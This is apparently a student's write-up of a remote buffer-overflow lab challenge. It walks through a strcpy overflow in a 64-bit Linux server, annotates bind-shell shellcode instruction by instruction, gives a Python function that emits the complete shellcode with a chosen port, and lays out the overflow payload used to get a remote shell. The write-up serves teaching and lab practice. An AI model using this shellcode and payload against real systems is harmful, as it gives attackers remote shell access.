#Sam's p13x solution

Here is the original challange page: [https://samsclass.info/127/proj/p13x-64bo-remote.htm](https://samsclass.info/127/proj/p13x-64bo-remote.htm).


To the core
-----------

This is the vulnerable function:

```c
int vuln(char * buffer)
{
    char buf[678];
    strcpy(buf, buffer);
}
```

Which is compiled to:

	[0x00400a76 25% 120 p13x]> pd $r @ sym.vuln                                     
	╒ (fcn) sym.vuln 45                                                             
	│           ; var int local_0_1    @ rbp-0x1                                    
	│           ; var int local_86     @ rbp-0x2b0                                  
	│           ; var int local_87     @ rbp-0x2b8                                  
	│           ; CALL XREF from 0x00400dd1 (sym.vuln)                              
	│           0x00400a76    55             push rbp                               
	│           0x00400a77    4889e5         mov rbp, rsp                           
	│           0x00400a7a    4881ecc00200.  sub rsp, 0x2c0                         
	│           0x00400a81    4889bd48fdff.  mov qword [rbp-local_87], rdi          
	│           0x00400a88    488b9548fdff.  mov rdx, qword [rbp-local_87]          
	│           0x00400a8f    488d8550fdff.  lea rax, [rbp-local_86]                
	│           0x00400a96    4889d6         mov rsi, rdx                           
	│           0x00400a99    4889c7         mov rdi, rax                           
	│           0x00400a9c    e87ffdffff     call sym.imp.strcpy           ;[1]     
	│             ^- sym.imp.strcpy()                                               
	│           0x00400aa1    c9             leave                                  
	╘           0x00400aa2    c3             ret                                    

This permits to overflow the buffer because strcpy doesn't check lengths, as long as there arent null bytes in our payload. The allocated buffer is 678 bytes long, leaving us with 4096-768 bytes of overflow, which is pretty much.

The null byte avoidance requirement prevents us from using direct ROP tecniques because all addresses within the executable virtual address space should be zero-padded. 

Fortunately here the stack is executable:

	:> i~nx
	nx       false

We can verify it running a local instance of the server and then querying its maps:

	# cat /proc/`pgrep p13x`/maps | grep rwx 
		
		[...]

		7fffca43d000-7fffca45e000 rwxp 00000000 00:00 0                          [stack]

Demistifying shellcode
----------------------

So it's time for some old-school shellcoding! Let's ask google "shellcode linux x64", the first result points me to this: 

[http://shell-storm.org/shellcode/files/shellcode-858.php](http://shell-storm.org/shellcode/files/shellcode-858.php)

Seeing a shellcode for the first time, it can appear scary and overly complex, or even - literally - mystical. In fact, especially in this case, by understanding it line by line it is possible to discover that it is dead simple:


	; 0 - zeroing out things

	  400080:   48 31 c0                xor    rax,rax
	  400083:   48 31 ff                xor    rdi,rdi
	  400086:   48 31 f6                xor    rsi,rsi
	  400089:   48 31 d2                xor    rdx,rdx
	  40008c:   4d 31 c0                xor    r8,r8

	; 1 - create a socket

	  ; family = 2
	  40008f:   6a 02                   push   0x2
	  400091:   5f                      pop    rdi

	  ; type = 1
	  400092:   6a 01                   push   0x1
	  400094:   5e                      pop    rsi

	  ; protocol = 6
	  400095:   6a 06                   push   0x6
	  400097:   5a                      pop    rdx

	  ; socket(2,1,6) call
	  400098:   6a 29                   push   0x29
	  40009a:   58                      pop    rax
	  40009b:   0f 05                   syscall

	  ; store the new socket in r8
	  40009d:   49 89 c0                mov    r8,rax


	; 2 - bind the socket to the chosen port


	  ; allocate and zero-out 16 bytes, the space for struct sockaddr:
	  ;			struct sockaddr {
	  ;               sa_family_t sa_family;
	  ;               char        sa_data[14];
	  ;          	}

	  4000a0:   4d 31 d2                xor    r10,r10
	  4000a3:   41 52                   push   r10
	  4000a5:   41 52                   push   r10

	  ; sockaddr.sa_family = 2
	  4000a7:   c6 04 24 02             mov    BYTE PTR [rsp],0x2

	  ; sockaddr.sa_data = PORT (BIG ENDIAN) and 0.0.0.0 ip address
	  4000ab:   66 c7 44 24 02 PO RT    mov    WORD PTR [rsp+0x2],RTPO
	  4000b2:   48 89 e6                mov    rsi,rsp

	  ; fd = the socket created in (1)
	  4000b5:   41 50                   push   r8
	  4000b7:   5f                      pop    rdi

	  ; addrlen = 16 (sizeof(struct sockaddr))
	  4000b8:   6a 10                   push   0x10
	  4000ba:   5a                      pop    rdx

	  ; bind(fd, sockaddr, addrlen) call
	  4000bb:   6a 31                   push   0x31
	  4000bd:   58                      pop    rax
	  4000be:   0f 05                   syscall

	; 3 - listen

	  ; fd = the socket 
	  4000c0:   41 50                   push   r8
	  4000c2:   5f                      pop    rdi

	  ; backlog = 1
	  4000c3:   6a 01                   push   0x1
	  4000c5:   5e                      pop    rsi

	  ; listen(fd, TRUE) call
	  4000c6:   6a 32                   push   0x32
	  4000c8:   58                      pop    rax
	  4000c9:   0f 05                   syscall 

	; 4 - accept (this will block until an incoming connection occurs)

	  ; peer_sockaddr = reuse the structure allocated in (2)
	  4000cb:   48 89 e6                mov    rsi,rsp

	  ; twisted way to get a pointer to constant 0x10
	  ; peer_addrlen * = pointer to 0x10
	  4000ce:   48 31 c9                xor    rcx,rcx
	  4000d1:   b1 10                   mov    cl,0x10
	  4000d3:   51                      push   rcx
	  4000d4:   48 89 e2                mov    rdx,rsp

	  ; fd = the socket
	  4000d7:   41 50                   push   r8
	  4000d9:   5f                      pop    rdi

	  ; accept(fd, peer_sockaddr*, peer_addrlen*)
	  4000da:   6a 2b                   push   0x2b
	  4000dc:   58                      pop    rax
	  4000dd:   0f 05                   syscall 

	  ; remove the 0x10 from the stack
	  4000df:   59                      pop    rcx

	; 5 - dup2 to replace stdin and stdout with socket's

	  ; oldfd = socket fd returned from accept()
	  4000e0:   4d 31 c9                xor    r9,r9
	  4000e3:   49 89 c1                mov    r9,rax
	  4000e6:   4c 89 cf                mov    rdi,r9

	  ; newfd = 3 (stderr)
	  4000e9:   48 31 f6                xor    rsi,rsi
	  4000ec:   6a 03                   push   0x3
	  4000ee:   5e                      pop    rsi
	00000000004000ef <doop>:

	  ; newfd--
	  4000ef:   48 ff ce                dec    rsi

	  ; dup2(socket, newfd)
	  4000f2:   6a 21                   push   0x21
	  4000f4:   58                      pop    rax
	  4000f5:   0f 05                   syscall 

	  ; loop until new descriptor is 0 (flags here are set by 'dec')
	  4000f7:   75 f6                   jne    4000ef <doop>


	; 6 - execute the shell!

	  ; argv and envp = NULL
	  4000f9:   48 31 ff                xor    rdi,rdi
	  4000fc:   57                      push   rdi
	  4000fd:   57                      push   rdi
	  4000fe:   5e                      pop    rsi
	  4000ff:   5a                      pop    rdx

	  ; filename = /bin/sh (the first '/' is duplicated, to avoid explicit null terminator)
	  ; use little endian 64-bit integer representation of a sequence of chars
	  400100:   48 bf 2f 2f 62 69 6e    movabs rdi,0x68732f6e69622f2f
	  400107:   2f 73 68 

	  ; add the null terminator by shifting right, (yeah, little endian string)
	  40010a:   48 c1 ef 08             shr    rdi,0x8

	  ; make a pointer to it
	  40010e:   57                      push   rdi
	  40010f:   54                      push   rsp
	  400110:   5f                      pop    rdi

	  ; execve('/bin/dash', NULL, NULL) call
	  400111:   6a 3b                   push   0x3b
	  400113:   58                      pop    rax
	  400114:   0f 05                   syscall 


To decode syscall numbers, i used this: [https://filippo.io/linux-syscall-table/](https://filippo.io/linux-syscall-table/).

Ok, now that's demistified a bit, here is a slightly shorter version (it reduces down to 120 bytes) - i guess it can be shortened further, but in this case we already have overflow space to waste: [shell.nasm](shell.nasm). Basically i removed all the unnecessary `xor` instructions and simplified unnecessarily weird pointer creations (like the one at `4000ce`).


By concatenating the hex representation of this, leaving the PORT string as a placeholder for the given port, here is the python3 code to generate the shellcode which binds a shell to the given port using a socket:

```python
def get_shellcode(port):
	hexcode = "6a025f6a015e6a065a6a29580f054989c04d31d241524152c604240266c7442402PORT4889e641505f6a105a6a31580f0541505f6a015e6a32580f054889e66a104889e241505f6a2b580f054889c76a035e48ffce6a21580f0575f64831f64831d248bf2f2f62696e2f736848c1ef0857545f6a3b580f05"
	    
	# render the port to BIG endian
	hexport = str(binascii.hexlify(bytearray([ (port >> 8) & 0xff, port & 0xff])), 'utf-8')

	# inject the port in the shellcode
	return binascii.unhexlify(bytes(hexcode.replace("PORT",hexport), 'utf-8'))
```

The exploit
-----------

Equipped with all the above, it is possible to write a working exploit, which consists of the following steps:

1. connect to the target
2. get the buffer address (needed because of ASLR, it will change at each execution)
3. send enough data to overflow the buffer in the vuln() function:
	* must contain the shellcode, to be placed in the stack
	* must overwrite the return pointer in the stack with the shellcode address calculated using buffer address
4. once the shellcode is sent, open another connection to the chosen port to access our shell
5. send the commands to the shell to reach our objective

### Buffer overflow

Here is one of the possible buffer designs for a successful buffer overflow attack:

Chunk len | Content 
----------+--------
0x2b0     | 'A' sequence padding
0x8       | frame pointer overwrite (unused, can be 'A'*8 )
0x8       | pointer to shellcode ( buffer addr + 0x2b0 +8 + 8)
0x78      | shellcode

This is ok since we have plenty of space, if we had only 16 bytes or less, the shellcode could have been placed inside the buffer, reducing thereby the amount of initial padding 'A's.

### Solution script and cinema

My solution script is [here](p13x.py). It's written in python3 and depends on [binexpect](https://github.com/wapiflapi/binexpect). Here is the live capture of the exploit running on Sam's server:

[![asciicast](https://asciinema.org/a/1n46beesggchflj8hjcah1ypf.png)](https://asciinema.org/a/1n46beesggchflj8hjcah1ypf)

I know, it's disappointing, it goes on forever, but i forgot it was running and went away for a while...
